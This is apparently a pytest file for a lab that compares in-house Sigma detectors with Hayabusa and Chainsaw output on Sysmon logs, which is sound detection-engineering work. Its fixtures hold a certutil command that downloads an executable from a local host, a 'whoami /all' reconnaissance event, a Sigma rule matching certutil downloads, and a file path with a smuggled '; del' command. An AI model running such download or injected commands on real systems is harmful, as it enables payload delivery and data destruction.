"""Lab: Second opinion (engine/labs/secondopinion.py). Our side runs the real detectors (engine.score) with a
one-rule Sigma folder; the outside tools are stand-ins that write their real output formats."""

import json
import os
import re
import subprocess

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from engine.labs import secondopinion as S
from nighttools_fixtures import configure

BANNED = re.compile(r"\b(probably|likely|safe|secure|all clear|all good|no threats?|clean|proven|detected|caught|"
                    r"malicious|attack(?:er)?)\b", re.I)
NS = "http://schemas.microsoft.com/win/2004/08/events/event"

SIGMA_RULE = """title: Night test certutil download
id: 00000000-0000-4000-8000-00000000c001
status: test
level: high
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\\\certutil.exe'
    CommandLine|contains: 'urlcache'
  condition: selection
"""


def event_xml(rid, eid, data, channel="Microsoft-Windows-Sysmon/Operational", t="2026-11-01T10:00:00.0000000Z"):
    fields = "".join(f"<Data Name='{k}'>{v}</Data>" for k, v in data.items())
    return (f"<Event xmlns='{NS}'><System><Provider Name='Microsoft-Windows-Sysmon'/><EventID>{eid}</EventID>"
            f"<TimeCreated SystemTime='{t}'/><EventRecordID>{rid}</EventRecordID><Channel>{channel}</Channel>"
            f"<Computer>TESTVM</Computer></System><EventData>{fields}</EventData></Event>")


LOG = "".join([
    event_xml(101, 1, {"UtcTime": "2026-11-01 10:00:00.000", "ProcessGuid": "{a}", "Image": "C:\\Windows\\System32\\certutil.exe",
                       "CommandLine": "certutil -urlcache -f http://10.0.2.2:18765/p.exe p.exe", "ParentImage": "C:\\x\\cmd.exe"}),
    event_xml(102, 1, {"UtcTime": "2026-11-01 10:00:01.000", "ProcessGuid": "{b}", "Image": "C:\\Windows\\System32\\whoami.exe",
                       "CommandLine": "whoami /all"}, t="2026-11-01T10:00:01.0000000Z"),
    event_xml(103, 1, {"UtcTime": "2026-11-01 10:00:02.000", "ProcessGuid": "{c}", "Image": "C:\\Windows\\System32\\notepad.exe",
                       "CommandLine": "notepad"}, t="2026-11-01T10:00:02.0000000Z"),
])


class Done:
    def __init__(self, stdout="", returncode=0, stderr=""):
        self.stdout, self.returncode, self.stderr = stdout, returncode, stderr


def fake_runner(calls):
    """wevtutil gives LOG; hayabusa flags 101 and 102 (+ one event in another log); chainsaw flags 101."""
    def run(cmd, **kw):
        calls.append(cmd)
        exe = os.path.basename(cmd[0]).lower()
        if exe == "wevtutil":
            return Done(LOG)
        out = cmd[cmd.index("-o") + 1]
        if exe.startswith("hayabusa"):
            lines = [{"Timestamp": "2026-11-01 10:00:00.000 +00:00", "RuleTitle": "Certutil Download", "Level": "high",
                      "Computer": "TESTVM", "Channel": "Sysmon", "EventID": 1, "RecordID": 101},
                     {"Timestamp": "2026-11-01 10:00:01.000 +00:00", "RuleTitle": "Whoami All", "Level": "med",
                      "Channel": "Sysmon", "EventID": 1, "RecordID": 102},
                     {"RuleTitle": "Info only", "Level": "info", "Channel": "Sysmon", "RecordID": 103},
                     {"RuleTitle": "Logon", "Level": "high", "Channel": "Sec", "RecordID": 99999}]
            with open(out, "w", encoding="utf-8") as f:
                f.write("\n".join(json.dumps(x) for x in lines))
        else:
            hits = [{"group": "Sigma", "kind": "individual", "name": "Certutil Urlcache", "level": "high",
                     "timestamp": "2026-11-01T10:00:00Z",
                     "document": {"kind": "evtx", "data": {"Event": {"System": {"EventRecordID": 101,
                                                                                  "Channel": "Microsoft-Windows-Sysmon/Operational"}}}}}]
            with open(out, "w", encoding="utf-8") as f:
                json.dump(hits, f)
        return Done()
    return run


@pytest.fixture
def one_rule(tmp_path, monkeypatch):
    from engine import detect
    d = tmp_path / "sigma"
    d.mkdir()
    (d / "night_certutil.yml").write_text(SIGMA_RULE, encoding="utf-8")
    rules = detect.load_rules([str(d)], "sigma")[0]
    assert len(rules) == 1
    monkeypatch.setitem(S._rules, "rules", rules)
    return rules


@pytest.fixture
def downloads(tmp_path, monkeypatch):
    night = tmp_path / "downloads" / "night"
    (night / "samples").mkdir(parents=True)
    (night / "samples" / "test_sysmon.evtx").write_bytes(b"ElfFile\x00 not really parsed: wevtutil is a stand-in")
    for tool, exe in (("hayabusa", "hayabusa-3.0.0-win-x64.exe"), ("chainsaw", "chainsaw_x86_64-pc-windows-msvc.exe")):
        (night / tool).mkdir()
        (night / tool / exe).write_bytes(b"MZ")
    (night / "chainsaw" / "mappings").mkdir()
    monkeypatch.setenv("ANALYSTLAB_NIGHT_DOWNLOADS", str(night))
    monkeypatch.setattr(S, "WORK", str(tmp_path / "work"))
    monkeypatch.setattr(S, "OURS_IN_PROCESS", True)        # the worker process would load all rules (~40 s)
    S._jobs.clear()
    return night


def test_our_side_from_the_worker_cache_when_it_was_made_for_this_very_file(tmp_path, monkeypatch, downloads):
    from engine.labs import _so_worker as W
    monkeypatch.setattr(S, "OURS_IN_PROCESS", False)
    item = S.evtx_files()[0]
    work = tmp_path / "w"
    work.mkdir()
    cached = {"version": W.VERSION, "fingerprint": W.fingerprint(item["path"]), "records": [{"record_id": 1, "channel": S.SYSMON, "time": None,
              "event_id": 1, "data": {}}], "ours": [{"title": "T", "level": "high", "record_ids": [1]}], "errors": 0, "rules": 7}
    (work / "ours.json").write_text(json.dumps(cached), encoding="utf-8")
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: pytest.fail("no worker when the cache fits"))
    records, ours, errors, rules = S.ours_for(item, str(work))
    assert rules == 7 and ours[0]["title"] == "T" and records[0]["record_id"] == 1
    # the file changed: the cache no longer fits, so the worker is asked (here: it fails, and that is said)
    os.utime(item["path"], (1, 1))
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: Done("", 1, "boom"))
    with pytest.raises(RuntimeError, match="boom"):
        S.ours_for(item, str(work))


def test_the_worker_writes_slim_records():
    from engine.labs import _so_worker as W
    recs = S.read_evtx("x.evtx", runner=fake_runner([]))
    s = W.slim(recs)
    assert s[0] == {"record_id": 101, "time": "2026-11-01T10:00:00.0000000Z", "event_id": 1, "channel": S.SYSMON,
                    "data": {"Image": "C:\\Windows\\System32\\certutil.exe", "ProcessGuid": "{a}"}}
    assert "CommandLine" not in json.dumps(s)


def test_read_evtx_makes_agent_shaped_records_and_passes_the_path_as_one_argument():
    calls = []
    recs = S.read_evtx("C:\\logs\\a b; del x.evtx", runner=fake_runner(calls))
    assert calls[0][:3] == ["wevtutil", "qe", "C:\\logs\\a b; del x.evtx"]
    assert [r["record_id"] for r in recs] == [101, 102, 103]
    r = recs[0]
    assert r["host"] == "TESTVM" and r["source"] == "sysmon" and r["event_id"] == 1 and r["origin"] == "normal"
    assert r["data"]["Image"].endswith("certutil.exe")


def test_parsers_read_the_tools_real_output_shapes():
    h = S.parse_hayabusa('{"RuleTitle": "A", "Level": "crit", "RecordID": 5}\nnot json\n{"RuleTitle": "B", "Level": "med"}')
    assert h == [{"rule": "A", "level": "critical", "record_id": 5, "channel": None, "time": None}]
    c = S.parse_chainsaw(json.dumps([{"name": "X", "level": "low", "kind": "aggregate", "documents": [
        {"data": {"Event": {"System": {"EventRecordID": 7}}}}, {"data": {"Event": {"System": {"EventRecordID": "8"}}}}]}]))
    assert [x["record_id"] for x in c] == [7, 8] and c[0]["level"] == "low"
    assert S.parse_chainsaw("garbage") == []


def test_our_side_runs_the_real_detectors_on_the_log(tmp_path, one_rule):
    recs = S.read_evtx("x.evtx", runner=fake_runner([]))
    ours, errors = S.our_side(recs, str(tmp_path), rules=one_rule)
    hits = [a for a in ours if a["title"] == "Night test certutil download"]
    assert len(hits) == 1 and hits[0]["record_ids"] == [101] and hits[0]["level"] == "high"


def test_compare_lines_up_both_only_ours_only_theirs_and_other_logs():
    recs = S.read_evtx("x.evtx", runner=fake_runner([]))
    ours = [{"title": "Ours A", "level": "high", "record_ids": [101]}, {"title": "Ours B", "level": "medium", "record_ids": [103]},
            {"title": "Ours low", "level": "low", "record_ids": [102]}]
    theirs = {"hayabusa": S.parse_hayabusa("\n".join(json.dumps(x) for x in [
        {"RuleTitle": "H1", "Level": "high", "RecordID": 101}, {"RuleTitle": "H2", "Level": "med", "RecordID": 102},
        {"RuleTitle": "Hsec", "Level": "high", "RecordID": 5555}]))}
    c = S.compare(recs, ours, theirs, min_level="medium")
    v = {r["record_id"]: r["verdicts"].get("hayabusa") for r in c["rows"]}
    assert v == {101: "both", 102: "only_theirs", 103: "only_ours"}          # "Ours low" is below the floor
    assert c["counts"] == {"hayabusa": {"both": 1, "near": 0, "only_ours": 1, "only_theirs": 1}}
    assert c["other_channels"] == {"hayabusa": 1} and c["sysmon_events"] == 3
    assert next(r for r in c["rows"] if r["record_id"] == 101)["image"].endswith("certutil.exe")


def rec(rid, t, proc, eid=1, src=None):
    data = {"ProcessGuid": proc} if eid not in (8, 10) else {"SourceProcessGUID": src or proc}
    return {"record_id": rid, "time": t, "event_id": eid, "channel": S.SYSMON, "data": data}


def test_same_process_within_a_minute_is_near_and_a_minute_later_or_another_process_is_not():
    recs = [rec(1, "2026-11-01T10:00:00.000Z", "{p}"), rec(2, "2026-11-01T10:00:59.000Z", "{p}", eid=3),
            rec(3, "2026-11-01T10:01:01.5Z", "{p}", eid=11), rec(4, "2026-11-01T10:00:10Z", "{q}"),
            rec(5, "2026-11-01T10:00:20Z", None, eid=10, src="{p}")]
    ours = [{"title": "O", "level": "high", "record_ids": [1]}]
    theirs = {"t": [{"rule": "T", "level": "high", "record_id": rid} for rid in (2, 3, 4, 5)]}
    c = S.compare(recs, ours, theirs, min_level="medium")
    v = {r["record_id"]: r["verdicts"]["t"] for r in c["rows"]}
    # 2: same process 59 s later; 5: process access BY that process 20 s later; 3: 61.5 s later; 4: another process
    assert v == {1: "near", 2: "near", 5: "near", 3: "only_theirs", 4: "only_theirs"}
    assert c["counts"]["t"] == {"both": 0, "near": 3, "only_ours": 0, "only_theirs": 2}
    assert S.process_of(recs[4]) == "{p}" and S.process_of({"event_id": 1, "data": {}}) is None


def test_hayabusa_4_uses_dfir_timeline_and_older_ones_json_timeline():
    new = S.tool_command("hayabusa", "C:\\t\\hayabusa-4.4.0-win-x64.exe", "a.evtx", "o.jsonl")
    assert new[1:4] == ["dfir-timeline", "-f", "a.evtx"] and new[new.index("-t") + 1] == "jsonl" and "-w" in new
    old = S.tool_command("hayabusa", "C:\\t\\hayabusa-2.17.0-win-x64.exe", "a.evtx", "o.jsonl")
    assert old[1] == "json-timeline" and "-L" in old


def test_a_tool_runs_once_per_log_and_its_output_is_reused(tmp_path, downloads):
    calls = []
    exe = str(downloads / "hayabusa" / "hayabusa-3.0.0-win-x64.exe")
    evtx = str(downloads / "samples" / "test_sysmon.evtx")
    h1, _, cached1 = S.run_tool("hayabusa", exe, evtx, str(tmp_path), runner=fake_runner(calls))
    h2, _, cached2 = S.run_tool("hayabusa", exe, evtx, str(tmp_path), runner=fake_runner(calls))
    assert len(calls) == 1 and (cached1, cached2) == (False, True) and h1 == h2
    os.utime(evtx, (1, 1))                                                  # the log changed: run again
    S.run_tool("hayabusa", exe, evtx, str(tmp_path), runner=fake_runner(calls))
    assert len(calls) == 2


def test_opening_the_page_starts_nothing_a_post_runs_it_and_then_it_is_read_from_the_cache(tmp_path, monkeypatch, one_rule, downloads):
    calls = []
    real_start = S.start
    monkeypatch.setattr(S, "start", lambda item, rec, lvl: real_start(item, rec, lvl, runner=fake_runner(calls), background=False))
    configure(tmp_path, tmp_path / "missing.db")
    app = FastAPI()
    app.include_router(S.router)
    c = TestClient(app)
    lst = c.get("/api/labs/secondopinion").json()
    assert lst["tools"]["hayabusa"]["present"] and lst["tools"]["chainsaw"]["present"] and lst["running"] is None
    assert [f["name"] for f in lst["files"]] == ["test_sysmon.evtx"] and lst["suggested"] == lst["files"][0]["id"]
    assert "path" not in lst["files"][0]
    eid = lst["suggested"]
    # GET never starts anything (review fix 1): nothing has run, so "not_run", and no program was called
    r = c.get(f"/api/labs/secondopinion/result/{eid}?all_levels=true").json()
    assert r["state"] == "not_run" and calls == []
    assert c.get("/api/labs/secondopinion/summary").json()["rows"] == [] and calls == []
    # only an explicit POST runs it
    assert c.post(f"/api/labs/secondopinion/run/{eid}?all_levels=true").status_code == 200
    assert len(calls) == 3                                                    # wevtutil, hayabusa, chainsaw
    r = c.get(f"/api/labs/secondopinion/result/{eid}?all_levels=true").json()
    assert r["state"] == "ready", r
    res = r["result"]
    assert res["tools"]["hayabusa"]["state"] == "ran" and res["tools"]["chainsaw"]["state"] == "ran"
    rows = {x["record_id"]: x for x in res["rows"]}
    assert rows[101]["verdicts"] == {"hayabusa": "both", "chainsaw": "both"} and set(rows[101]["theirs"]) == {"hayabusa", "chainsaw"}
    assert rows[102]["verdicts"] == {"hayabusa": "only_theirs"}
    assert rows[103]["verdicts"] == {"hayabusa": "only_theirs"}                 # info counts at all levels
    assert res["other_channels"] == {"hayabusa": 1}
    hcmd = next(x for x in calls if os.path.basename(x[0]).startswith("hayabusa"))
    assert hcmd[1] == "json-timeline" and "-L" in hcmd and hcmd[hcmd.index("-f") + 1].endswith("test_sysmon.evtx")
    # the summary (first screen) is built from the kept results, still without running anything
    n = len(calls)
    s = c.get("/api/labs/secondopinion/summary").json()
    assert [x["file"]["name"] for x in s["rows"]] == ["test_sysmon.evtx"] and len(calls) == n
    assert set(s["rule_sets"]["tools"]) == {"hayabusa", "chainsaw"} and s["totals"]["hayabusa"]["both"] >= 0
    # the other level is computed from the same cache, still without running anything
    assert c.get(f"/api/labs/secondopinion/result/{eid}").json()["state"] == "ready" and len(calls) == n
    assert c.get("/api/labs/secondopinion/result/nope").status_code == 404
    assert c.post("/api/labs/secondopinion/run/nope").status_code == 404


def test_one_comparison_at_a_time(tmp_path, monkeypatch, downloads):
    configure(tmp_path, tmp_path / "missing.db")
    item = S.evtx_files()[0]
    S._jobs["other-log"] = {"state": "working", "step": "running hayabusa", "started": 0, "name": "other.evtx"}
    with pytest.raises(S.Busy):
        S.start(item, None, "medium", runner=fake_runner([]), background=False)
    app = FastAPI()
    app.include_router(S.router)
    c = TestClient(app)
    r = c.post(f"/api/labs/secondopinion/run/{item['id']}")
    assert r.status_code == 409 and "other.evtx" in r.json()["detail"]
    assert c.get("/api/labs/secondopinion").json()["running"]["name"] == "other.evtx"
    assert c.get(f"/api/labs/secondopinion/result/{item['id']}").json() == {
        "file": {k: item[k] for k in ("id", "name", "kind", "folder", "size", "sysmon")}, "state": "not_run", "busy": "other.evtx"}


def test_a_missing_tool_is_said_and_the_rest_still_runs(tmp_path, monkeypatch, one_rule, downloads):
    import shutil
    shutil.rmtree(downloads / "chainsaw")
    item = S.evtx_files()[0]
    st = S.start(item, None, "high", runner=fake_runner([]), background=False)
    assert st["state"] == "ready"
    assert st["result"]["tools"]["chainsaw"] == {"state": "missing"} and st["result"]["tools"]["hayabusa"]["state"] == "ran"
    assert st["result"]["counts"]["hayabusa"]["both"] == 1                   # 101: ours high + hayabusa high
    assert "chainsaw" not in st["result"]["counts"]
    assert S.cached_result(item, None, "high")["counts"] == st["result"]["counts"]      # the same, from the cache


def test_vm_exports_are_listed_before_samples(tmp_path, downloads):
    run = tmp_path / "rec" / "vmruns" / "20261123-s1"
    run.mkdir(parents=True)
    (run / "sysmon.evtx").write_bytes(b"x")
    files = S.evtx_files(str(tmp_path / "rec"))
    assert [f["kind"] for f in files] == ["vm", "sample"] and files[0]["folder"] == "20261123-s1"


@pytest.mark.skipif(os.name != "nt", reason="wevtutil is Windows' own")
def test_real_wevtutil_on_a_public_sample_if_present(tmp_path, one_rule):
    samples = [f for f in S.evtx_files() if f["kind"] == "sample" and f["name"] == "PanacheSysmon_vs_AtomicRedTeam01.evtx"]
    if not samples:
        pytest.skip("the public sample logs are not downloaded here")
    recs = S.read_evtx(samples[0]["path"])
    assert len(recs) > 100 and all(r["channel"] == S.SYSMON for r in recs)
    ours, errors = S.our_side(recs, str(tmp_path), rules=one_rule)
    assert errors == []


def test_our_words_never_overclaim():
    assert not BANNED.search(json.dumps(S.WORDS)), BANNED.search(json.dumps(S.WORDS))


def test_technical_names_have_plain_words():
    """W3-6: every technical name on the page has a one-line plain meaning (served by Python)."""
    from engine.labs import secondopinion as M
    assert sorted(M.WORDS["jargon"]) == sorted(['Hayabusa', 'Chainsaw', 'Sigma', '.evtx'])
    assert all(len(v) > 20 and not BANNED.search(v) for v in M.WORDS["jargon"].values())
